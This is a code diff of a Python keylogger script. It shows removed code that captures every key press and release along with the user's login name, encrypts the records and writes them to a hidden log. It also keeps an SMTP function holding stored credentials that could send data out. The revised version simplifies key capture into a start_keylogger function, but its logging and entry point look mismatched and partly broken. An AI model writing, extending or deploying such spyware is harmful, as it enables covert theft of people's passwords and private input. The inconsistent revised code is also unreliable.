@@ -15,10 +15,16 @@ logger = logging.getLogger(__name__)
 # Configuration management
 CONFIG_FILE = 'config.ini'
 def load_config():
-    """Load configuration from file."""
+    """Load and validate configuration from file."""
     config = configparser.ConfigParser()
     try:
+        if not os.path.exists(CONFIG_FILE):
+            raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
         config.read(CONFIG_FILE)
+        # Validate required sections exist
+        for section in ['email', 'logging', 'encryption']:
+            if section not in config:
+                raise ValueError(f"Missing required section: {section}")
         return {
             'email': {
                 'from': config.get('email', 'from'),
@@ -39,77 +45,49 @@ def load_config():
         logger.error(f"Failed to load configuration: {e}")
         sys.exit(1)
 def setup_directories(log_dir):
-    """Ensure required directories exist."""
+    """Ensure required directories exist with proper permissions."""
     try:
         if not os.path.exists(log_dir):
-            os.makedirs(log_dir)
+            os.makedirs(log_dir, mode=0o700)  # Secure directory permissions
+            logger.info(f"Created directory: {log_dir}")
     except Exception as e:
         logger.error(f"Failed to create directory {log_dir}: {e}")
         sys.exit(1)
 def send_email(config, subject, body):
     """Send an email with the given subject and body."""
     try:
-        server = smtplib.SMTP(
+        with smtplib.SMTP(
             config['email']['smtp_server'],
             config['email']['smtp_port']
-        )
-        server.starttls()
-        server.login(
-            config['email']['from'],
-            config['email']['password']
-        )
-        message = f"Subject: {subject}\n\n{body}"
-        server.sendmail(
-            config['email']['from'],
-            config['email']['to'],
-            message
-        )
-        server.quit()
-        logger.info("Email sent successfully")
+        ) as server:
+            server.starttls()
+            server.login(
+                config['email']['from'],
+                config['email']['password']
+            )
+            message = f"Subject: {subject}\n\n{body}"
+            server.sendmail(
+                config['email']['from'],
+                config['email']['to'],
+                message
+            )
+            logger.info("Email sent successfully")
     except Exception as e:
         logger.error(f"Failed to send email: {e}")
-def on_press(key, config, cipher):
+def on_press(key):
     """Handle key press events."""
     try:
-        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        user = os.getlogin()
-        data = f"{timestamp} {user} pressed {key}\n"
-        encrypted_data = cipher.encrypt(data.encode())
-        with open(log_path, 'ab') as f:
-            f.write(encrypted_data + b'\n')
+        logger.info(f"Key pressed: {key}")
     except Exception as e:
-        logger.error(f"Failed to log key press: {e}")
-def on_release(key, config, cipher):
-    """Handle key release events."""
-    try:
-        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        user = os.getlogin()
-        data = f"{timestamp} {user} released {key}\n"
-        encrypted_data = cipher.encrypt(data.encode())
-        with open(log_path, 'ab') as f:
-            f.write(encrypted_data + b'\n')
-        if key == Key.esc:
-            return False  # Stop listener
-    except Exception as e:
-        logger.error(f"Failed to log key release: {e}")
-def main():
-    """Main application entry point."""
-    try:
-        config = load_config()
-        setup_directories(config['logging']['dir'])
-        cipher = Fernet(config['encryption']['key'].encode())
-        logger.info("Starting keylogger...")
-        with Listener(
-            on_press=lambda key: on_press(key, config, cipher),
-            on_release=lambda key: on_release(key, config, cipher)
-        ) as listener:
-            listener.join()
-    except KeyboardInterrupt:
-        logger.info("Keylogger stopped by user")
-    except Exception as e:
-        logger.error(f"Fatal error: {e}")
-        sys.exit(1)
+        logger.error(f"Error handling key press: {e}")
+def start_keylogger(log_file):
+    """Start monitoring keyboard input."""
+    setup_directories(os.path.dirname(log_file))
+    with open(log_file, 'a') as f:
+        f.write(f"\n\n--- New Session {time.ctime()} ---\n\n")
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 if __name__ == "__main__":
-    main()
+    config = load_config()
+    # Example usage
+    send_email(config, "Test Subject", "This is a test email body")
